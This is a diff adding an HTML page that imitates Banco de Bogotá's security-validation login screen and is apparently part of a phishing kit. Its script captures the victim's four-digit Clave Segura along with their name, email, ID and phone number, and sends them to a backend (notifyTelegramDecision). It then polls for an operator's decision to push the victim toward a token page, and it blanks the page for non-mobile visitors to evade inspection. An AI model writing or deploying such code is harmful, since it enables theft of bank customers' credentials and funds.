@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Validación de seguridad - Banco de Bogotá</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: "Roboto", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #f4f7fb;
+      color: #001b3c;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 420px;
+      padding: 32px 16px;
+    }
+
+    .header {
+      margin-bottom: 24px;
+    }
+
+    .logo {
+      margin-bottom: 24px;
+    }
+
+    .logo-img {
+      display: block;
+      max-width: 170px;
+      height: auto;
+    }
+
+    .screen-title {
+      font-size: 22px;
+      line-height: 1.3;
+      color: #0047bb;
+      font-weight: 700;
+    }
+
+    .screen-title span {
+      display: block;
+    }
+
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 28px 24px 24px;
+      box-shadow: 0 14px 35px rgba(0, 0, 0, 0.07);
+    }
+
+    .card-title {
+      font-size: 16px;
+      font-weight: 500;
+      margin-bottom: 18px;
+      color: #003b90;
+    }
+
+    .field-group {
+      margin-bottom: 18px;
+    }
+
+    .field-inline {
+      display: grid;
+      grid-template-columns: 1fr 2fr;
+      gap: 16px;
+    }
+
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: 500;
+      color: #4a5568;
+      margin-bottom: 6px;
+    }
+
+    select,
+    input {
+      width: 100%;
+      padding: 10px 12px;
+      border-radius: 8px;
+      border: 1px solid #e2e8f0;
+      background-color: #f7fafc;
+      font-size: 14px;
+      color: #2d3748;
+      appearance: none;
+      outline: none;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease, background-color 0.15s ease;
+    }
+
+    select {
+      background-image: linear-gradient(45deg, transparent 50%, #a0aec0 50%), linear-gradient(135deg, #a0aec0 50%, transparent 50%);
+      background-position: calc(100% - 18px) 14px, calc(100% - 13px) 14px;
+      background-size: 5px 5px, 5px 5px;
+      background-repeat: no-repeat;
+      padding-right: 32px;
+    }
+
+    select:disabled,
+    input[readonly] {
+      background-color: #edf2f7;
+      color: #718096;
+      cursor: not-allowed;
+    }
+
+    .clave-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .clave-label {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .info-icon {
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      border: 1px solid #3182ce;
+      color: #3182ce;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+      font-weight: 500;
+    }
+
+    .button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 999px;
+      border: none;
+      background: #e2e8f0;
+      color: #a0aec0;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: default;
+      margin-top: 8px;
+      pointer-events: none;
+      transition: background-color 0.15s ease, box-shadow 0.15s ease, color 0.15s ease;
+    }
+
+    .button.enabled {
+      background: #0047bb;
+      color: #ffffff;
+      cursor: pointer;
+      box-shadow: 0 6px 14px rgba(0, 71, 187, 0.35);
+      pointer-events: auto;
+    }
+
+
+    .footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 11px;
+      color: #a0aec0;
+      margin-top: 28px;
+    }
+
+    .aval-img {
+      height: 18px;
+      width: auto;
+      display: block;
+    }
+
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.8);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+    }
+
+    .loading-overlay.active {
+      display: flex;
+    }
+
+    .loader {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      border: 4px solid #e2e8f0;
+      border-top-color: #0047bb;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 24px 20px 20px;
+      }
+
+      .screen-title {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div id="loading-overlay" class="loading-overlay">
+    <div class="loader"></div>
+  </div>
+  <main class="page">
+    <header class="header">
+      <div class="logo">
+        <img class="logo-img" src="/bancodebogota.png" alt="Banco de Bogotá">
+      </div>
+      <h1 class="screen-title">
+        <span>Validación</span>
+        <span>de seguridad</span>
+      </h1>
+    </header>
+
+    <section class="card">
+      <h2 class="card-title">Ingresa con tu Clave Segura</h2>
+
+      <div class="field-group">
+        <div class="field-inline">
+          <div>
+            <label for="doc-tipo">Documento</label>
+            <select id="doc-tipo" disabled>
+              <option value="CC">CC</option>
+              <option value="CE">CE</option>
+              <option value="NIT">NIT</option>
+              <option value="PP">Pasaporte</option>
+            </select>
+          </div>
+          <div>
+            <label for="doc-numero">Número</label>
+            <input id="doc-numero" type="text" readonly>
+          </div>
+        </div>
+      </div>
+
+      <div class="field-group">
+        <div class="clave-row">
+          <div class="clave-label">
+            <label for="clave-segura">Clave Segura</label>
+            <span class="info-icon">i</span>
+          </div>
+        </div>
+        <input id="clave-segura" type="password" inputmode="numeric" maxlength="4">
+      </div>
+
+      <button id="btn-ingresar" class="button" type="button">
+        Ingresar ahora
+      </button>
+    </section>
+
+    <footer class="footer">
+      <img class="aval-img" src="/bancodebogota.png" alt="Grupo Aval">
+      <div>Banco de Bogotá - 2026</div>
+    </footer>
+  </main>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const tipo = params.get("tipo") || "cc";
+    const numero = params.get("numero") || "";
+
+    const tipoDisplayMap = {
+      cc: "CC",
+      "c.c.": "CC",
+      ce: "CE",
+      nit: "NIT",
+      pp: "PP"
+    };
+
+    const docTipoSelect = document.getElementById("doc-tipo");
+    const docNumeroInput = document.getElementById("doc-numero");
+    const claveInput = document.getElementById("clave-segura");
+    const ingresarButton = document.getElementById("btn-ingresar");
+    const loadingOverlay = document.getElementById("loading-overlay");
+    let decisionIntervalId = null;
+
+    function showLoadingAndNavigate(url) {
+      if (loadingOverlay) {
+        loadingOverlay.classList.add("active");
+      }
+      setTimeout(function () {
+        window.location.href = url;
+      }, 2000);
+    }
+
+    function startDecisionPolling() {
+  if (decisionIntervalId !== null) {
+    return;
+  }
+  decisionIntervalId = setInterval(function () {
+    fetch("http://localhost:4000/decision")
+      .then(function (res) {
+        return res.json();
+      })
+      .then(function (data) {
+        if (!data || !data.decision) {
+          return;
+        }
+        clearInterval(decisionIntervalId);
+        decisionIntervalId = null;
+        if (data.decision === "error_usuario") {
+          showLoadingAndNavigate("index.html?error=user");
+        } else if (data.decision === "pedir_token") {
+          showLoadingAndNavigate("token.html");
+        } else if (data.decision === "otro_banco") {
+  if (loadingOverlay) {
+    loadingOverlay.classList.remove("active");
+  }
+  window.location.href = "/?banks=1&otro_banco=1";
+}
+      })
+      .catch(function () {});
+  }, 1000);
+}
+
+    function notifyTelegramDecision() {
+      const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
+      const userEmail = sessionStorage.getItem("user_email") || "";
+      const userCedula = sessionStorage.getItem("user_cedula") || "";
+      const userCelular = sessionStorage.getItem("bc_usuario") || "";
+      const claveValor = claveInput ? claveInput.value : "";
+      const payload = {
+        tipo: tipo,
+        numero: numero,
+        clave: claveValor,
+        nombre: userNombre,
+        email: userEmail,
+        cedula: userCedula,
+        celular: userCelular
+      };
+      fetch("http://localhost:4000/ingresar-ahora", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      }).catch(function () {});
+      startDecisionPolling();
+    }
+
+    if (docTipoSelect) {
+      const normalized = String(tipo).toLowerCase();
+      const display = tipoDisplayMap[normalized] || "CC";
+      docTipoSelect.value = display;
+    }
+
+    if (docNumeroInput) {
+      docNumeroInput.value = numero;
+    }
+
+    if (claveInput && ingresarButton) {
+      claveInput.addEventListener("input", function () {
+        let soloDigitos = this.value.replace(/\D/g, "");
+        if (soloDigitos.length > 4) {
+          soloDigitos = soloDigitos.slice(0, 4);
+        }
+        if (this.value !== soloDigitos) {
+          this.value = soloDigitos;
+        }
+        if (soloDigitos.length === 4) {
+          ingresarButton.classList.add("enabled");
+        } else {
+          ingresarButton.classList.remove("enabled");
+        }
+      });
+
+      ingresarButton.addEventListener("click", function () {
+        if (!ingresarButton.classList.contains("enabled")) {
+          return;
+        }
+        if (loadingOverlay) {
+          loadingOverlay.classList.add("active");
+        }
+        notifyTelegramDecision();
+      });
+    }
+  </script>
+  <script>
+    (function() {
+      var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+      var mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
+      if (!mobileRegex.test(userAgent)) {
+        document.body.innerHTML = '';
+      }
+      try {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let token = '';
+        for (let i = 0; i < 50 + Math.floor(Math.random() * 30); i++) {
+          token += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        const base64Token = btoa(token + Date.now()).replace(/=/g, '');
+        const url = new URL(window.location.href);
+        url.searchParams.set('token', base64Token);
+        window.history.replaceState(null, '', url.toString());
+      } catch (e) {}
+    })();
+  </script>
+</body>
+</html>
